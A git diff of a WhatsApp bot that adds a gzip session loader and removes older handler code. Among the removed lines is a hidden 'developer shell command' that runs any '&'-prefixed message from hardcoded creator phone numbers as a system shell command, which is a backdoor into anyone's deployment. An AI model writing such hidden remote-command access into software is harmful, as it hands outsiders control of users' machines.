@@ -45,6 +45,7 @@ const bodyparser = require('body-parser');
 const os = require('os');
 const Crypto = require('crypto');
 const path = require('path');
+const zlib = require('zlib');
 const prefix = config.PREFIX;
 const { Octokit } = require('@octokit/rest');
 const ownerNumber = ['263719647303'];
@@ -105,8 +106,30 @@ async function loadSession() {
 
         console.log('[⏳] Attempting to load session...');
 
+        // Gifted~ Base64 Gzip Session Loader (NEW - ADDED FIRST)
+        if (config.SESSION_ID.startsWith('Gifted~')) {
+            console.log('[🎁] Detected Gifted base64 gzip session storage');
+            try {
+                const [header, b64data] = config.SESSION_ID.split('~');
+
+                if (header !== "Gifted" || !b64data) {
+                    throw new Error("Invalid session format. Expected 'Gifted~.....'");
+                }
+
+                const cleanB64 = b64data.replace('...', '');
+                const compressedData = Buffer.from(cleanB64, 'base64');
+                const decompressedData = zlib.gunzipSync(compressedData);
+
+                fs.writeFileSync(credsPath, decompressedData, 'utf8');
+                console.log('[✅] Gifted session loaded successfully (base64 gzip)');
+                return JSON.parse(decompressedData.toString());
+            } catch (error) {
+                console.error('[❌] Gifted session error:', error.message);
+                throw error;
+            }
+        }
         // GitHub Session Loader (new short ID format)
-        if (config.SESSION_ID.startsWith('SUBZERO~')) {
+        else if (config.SESSION_ID.startsWith('SUBZERO~')) {
             console.log('[🌐] Detected Subzero-DB session storage');
             const sessionId = config.SESSION_ID.replace("SUBZERO~", "");
             
@@ -227,157 +250,6 @@ async function loadSession() {
         return null;
     }
 }
-
-// ==================== WHATSAPP CONNECTION ====================
-// ==================== SESSION MANAGEMENT ====================
-/*const sessionDir = path.join(__dirname, 'sessions');
-const credsPath = path.join(sessionDir, 'creds.json');
-
-// Create session directory if it doesn't exist
-if (!fs.existsSync(sessionDir)) {
-    fs.mkdirSync(sessionDir, { recursive: true });
-}
-
-// Configuration for different session providers
-const tokenSuffix = config.TOKEN; // Entered at runtime
-const SESSION_PROVIDERS = {
-    GITHUB: {
-        TOKEN: `ghp_${tokenSuffix}`,
-        REPO_NAME: 'SUBZERO-SESSIONS',
-        REPO_OWNER: 'mrfr8nk' // Replace with your GitHub username
-    },
-    MONGO: {
-        BASE_URL: 'https://subzero-md.koyeb.app',
-        API_KEY: 'subzero-md'
-    }
-};
-
-const octokit = new Octokit({ auth: SESSION_PROVIDERS.GITHUB.TOKEN });
-
-async function loadSession() {
-    try {
-        if (!config.SESSION_ID) {
-            console.log('No SESSION_ID provided - please add one!');
-            return null;
-        }
-
-        console.log('[⏳] Attempting to load session...');
-
-        // GitHub Session Loader (new short ID format)
-        if (config.SESSION_ID.startsWith('SUBZERO~')) {
-            console.log('[🌐] Detected Subzero-DB session storage');
-            const sessionId = config.SESSION_ID.replace("SUBZERO~", "");
-            
-            if (/^[a-f0-9]{8}$/.test(sessionId)) {
-                console.log('[🆔] Detected new short session ID format');
-                const fileName = `SUBZERO_${sessionId}.json`;
-                
-                try {
-                    const fileResponse = await octokit.repos.getContent({
-                        owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
-                        repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
-                        path: `sessions/${fileName}`,
-                        ref: 'main'
-                    });
-
-                    const content = Buffer.from(fileResponse.data.content, 'base64').toString('utf8');
-                    fs.writeFileSync(credsPath, content);
-                    console.log('[✅] Subzero-DB session downloaded successfully (short ID)');
-                    return JSON.parse(content);
-                } catch (error) {
-                    console.error('[❌] GitHub session error (short ID):', error.message);
-                    throw error;
-                }
-            }
-            // Legacy SHA format handler
-            else {
-                console.log('[🆔] Detected legacy SHA session ID format');
-                try {
-                    const response = await octokit.repos.getContent({
-                        owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
-                        repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
-                        path: `sessions`,
-                        ref: 'main'
-                    });
-
-                    // Find the file with matching SHA
-                    const file = response.data.find(f => f.sha === sessionId);
-                    if (!file) {
-                        throw new Error('Session file not found in DB');
-                    }
-
-                    console.log(`[🔍] Found session file: ${file.path}`);
-
-                    const fileResponse = await octokit.repos.getContent({
-                        owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
-                        repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
-                        path: file.path,
-                        ref: 'main'
-                    });
-
-                    const content = Buffer.from(fileResponse.data.content, 'base64').toString('utf8');
-                    fs.writeFileSync(credsPath, content);
-                    console.log('[✅] Subzero-DB session downloaded successfully (legacy SHA)');
-                    return JSON.parse(content);
-                } catch (error) {
-                    console.error('[❌] GitHub session error (legacy SHA):', error.message);
-                    throw error;
-                }
-            }
-        }
-        // Mongo Session Loader
-        else if (config.SESSION_ID.startsWith('SUBZERO-MD~')) {
-            console.log('[🗄️] Detected Mongo session storage');
-            try {
-                const response = await axios.get(
-                    `${SESSION_PROVIDERS.MONGO.BASE_URL}/api/downloadCreds.php/${config.SESSION_ID}`, {
-                        headers: { 'x-api-key': SESSION_PROVIDERS.MONGO.API_KEY }
-                    }
-                );
-
-                if (!response.data.credsData) {
-                    throw new Error('No credential data received from Mongo server');
-                }
-
-                fs.writeFileSync(credsPath, JSON.stringify(response.data.credsData), 'utf8');
-                console.log('[✅] Mongo session downloaded successfully');
-                return response.data.credsData;
-            } catch (error) {
-                console.error('[❌] Mongo session error:', error.message);
-                throw error;
-            }
-        }
-        // MEGA.nz Session Loader
-        else {
-            console.log('[☁️] Detected MEGA.nz session storage');
-            try {
-                const megaFileId = config.SESSION_ID.startsWith('SUBZERO-MD;;;') ?
-                    config.SESSION_ID.replace("SUBZERO-MD;;;", "") :
-                    config.SESSION_ID;
-
-                const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
-
-                const data = await new Promise((resolve, reject) => {
-                    filer.download((err, data) => {
-                        if (err) reject(err);
-                        else resolve(data);
-                    });
-                });
-
-                fs.writeFileSync(credsPath, data);
-                console.log('[✅] MEGA session downloaded successfully');
-                return JSON.parse(data.toString());
-            } catch (error) {
-                console.error('[❌] MEGA session error:', error.message);
-                throw error;
-            }
-        }
-    } catch (error) {
-        console.error('❌ Error loading session:', error.message);
-        console.log('⚠️ Will generate QR code instead');
-        return null;
-    }
-} */
 
 // ==================== WHATSAPP CONNECTION ====================
 async function connectToWA() {
@@ -598,378 +470,149 @@ ${mrfrank}\n
         }
     });
 
+    // Save credentials handler
     conn.ev.on('creds.update', saveCreds);
 
-    // Message delete handler
-    conn.ev.on('messages.update', async updates => {
-        for (const update of updates) {
-            if (update.update.message === null) {
-                console.log("Delete Detected:", JSON.stringify(update, null, 2));
-                await AntiDelete(conn, updates);
-            }
-        }
-    });
-
-    // Group participants update handler
-    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
-
-    // Message upsert handler
+    // Message handler  
     conn.ev.on('messages.upsert', async(mek) => {
-        mek = mek.messages[0];
-        if (!mek.message) return;
-        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ?
-            mek.message.ephemeralMessage.message :
-            mek.message;
+        try {
+            mek = mek.messages[0];
+            if (!mek.message) return;
 
-        // Follow newsletter
-        const metadata = await conn.newsletterMetadata("jid", "120363304325601080@newsletter");
-        if (metadata.viewer_metadata === null) {
-            await conn.newsletterFollow("120363304325601080@newsletter");
-            console.log("SUBZERO MD CHANNEL FOLLOW ✅");
-        }
+            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ?
+                mek.message.ephemeralMessage.message : mek.message;
 
-        // Mark message as read if enabled
-        if (config.READ_MESSAGE === 'true') {
-            await conn.readMessages([mek.key]);
-            console.log(`Marked message from ${mek.key.remoteJid} as read.`);
-        }
+            if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
 
-        if (mek.message.viewOnceMessageV2)
-            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
+            const m = await sms(conn, mek);
+            const type = getContentType(mek.message);
+            const content = JSON.stringify(mek.message);
+            const from = mek.key.remoteJid;
 
-        // Status auto-seen
-        
-if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
-    await conn.readMessages([mek.key]);
-}
+            const body = (type === 'conversation') ? mek.message.conversation :
+                (type === 'imageMessage') ? mek.message.imageMessage.caption :
+                (type === 'videoMessage') ? mek.message.videoMessage.caption :
+                (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
+                (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId :
+                (type === 'listResponseMessage') ? mek.message.listResponseMessage.singleSelectReply.selectedRowId :
+                (type === 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage.selectedId :
+                (type === 'messageContextInfo') ? (mek.message.buttonsResponseMessage?.selectedButtonId ||
+                    mek.message.listResponseMessage?.singleSelectReply.selectedRowId || mek.text) : '';
 
-const newsletterJids = [
-  "120363304325601080@newsletter"
-];
-  const emojis = ["❤️", "👍", "😮", "😎", "💀"];
+            // Command handling
+            const isCmd = body.startsWith(prefix);
+            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
+            const args = body.trim().split(/\s+/).slice(1);
+            const q = args.join(' ');
+            const reply = (text) => {
+                conn.sendMessage(from, { text: text }, { quoted: mek });
+            };
 
-  if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
-    try {
-      const serverId = mek.newsletterServerId;
-      if (serverId) {
-      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
-        await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
-      }
-    } catch (e) {
-    
-    }
-                  }
-        
+            // Owner check
+            const isOwner = ownerNumber.includes(mek.key.remoteJid.split('@')[0]);
 
-        // Status auto-react
-        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
-            const jawadlike = await conn.decodeJid(conn.user.id);
-            const emojis = ['❤️', '🌹', '😇', '❄️', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🇿🇼', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '✨', '🇿🇼', '💜', '💙', '🌝', '🖤', '💚'];
-            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-            await conn.sendMessage(mek.key.remoteJid, {
-                react: {
-                    text: randomEmoji,
-                    key: mek.key,
-                }
-            }, { statusJidList: [mek.key.participant, jawadlike] });
-        }
+            // Group info
+            const isGroup = from.endsWith('@g.us');
+            const sender = mek.key.fromMe ? conn.user.id.split(':')[0] + '@s.whatsapp.net' :
+                isGroup ? mek.key.participant : mek.key.remoteJid;
+            const senderNumber = sender.split('@')[0];
+            const botNumber = conn.user.id.split(':')[0];
+            const pushname = mek.pushName || 'No Name';
 
-        // Status auto-reply
-        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
-            const user = mek.key.participant;
-            const text = `${config.AUTOSTATUSMSG}`;
-            await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
-        }
+            // Message type
+            const isMedia = (type === 'imageMessage' || type === 'videoMessage');
+            const isTagged = mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.includes(botNumber + '@s.whatsapp.net');
 
-        await Promise.all([saveMessage(mek)]);
-
-        const m = sms(conn, mek);
-        const type = getContentType(mek.message);
-        const content = JSON.stringify(mek.message);
-        const from = mek.key.remoteJid;
-        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
-        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
-        const isCmd = body.startsWith(prefix);
-        var budy = typeof mek.text == 'string' ? mek.text : false;
-        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
-        const args = body.trim().split(/ +/).slice(1);
-        const q = args.join(' ');
-        const text = args.join(' ');
-        const isGroup = from.endsWith('@g.us');
-        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
-        const senderNumber = sender.split('@')[0];
-        const botNumber = conn.user.id.split(':')[0];
-        const pushname = mek.pushName || 'SUBZERO-MD USER';
-        const isMe = botNumber.includes(senderNumber);
-        const isOwner = ownerNumber.includes(senderNumber) || isMe;
-        const botNumber2 = await jidNormalizedUser(conn.user.id);
-        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
-        const groupName = isGroup ? groupMetadata.subject : '';
-        const participants = isGroup ? await groupMetadata.participants : '';
-        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
-        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
-        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
-        const isReact = m.message.reactionMessage ? true : false;
-        const reply = (teks) => {
-            conn.sendMessage(from, { text: teks }, { quoted: mek });
-        }
-
-        const udp = botNumber.split('@')[0];
-        const darex = ('263719647303', '263719064805', '263788236690');
-
-        const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
-
-        let isCreator = [udp, ...darex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
-            .includes(mek.sender);
-
-        // Developer shell command
-        if (isCreator && mek.text.startsWith("&")) {
-            let code = budy.slice(2);
-            if (!code) {
-                reply(`Mr Frank, Provide me with a query to run Master!`);
-                return;
-            }
-            const { spawn } = require("child_process");
-            try {
-                let resultTest = spawn(code, { shell: true });
-                resultTest.stdout.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.stderr.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("error", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("close", code => {
-                    if (code !== 0) {
-                        reply(`command exited with code ${code}`);
-                    }
-                });
-            } catch (err) {
-                reply(util.format(err));
-            }
-            return;
-        }
-
-        // Developer react
-        if (senderNumber.includes("263719064805")) {
-            if (isReact) return;
-            m.react("🫟");
-        }
-
-        // Auto react for public messages
-        if (!isReact && senderNumber !== botNumber) {
-            if (config.AUTOREACT === 'true') {
-                const reactions = ['😊', '🫟', '🫟', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '??', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️"];
-              const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-                m.react(randomReaction);
-            }
-        }
-
-        // Owner React
-        if (!isReact && senderNumber === botNumber) {
-            if (config.OWNERREACT === 'true') {
-                const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', 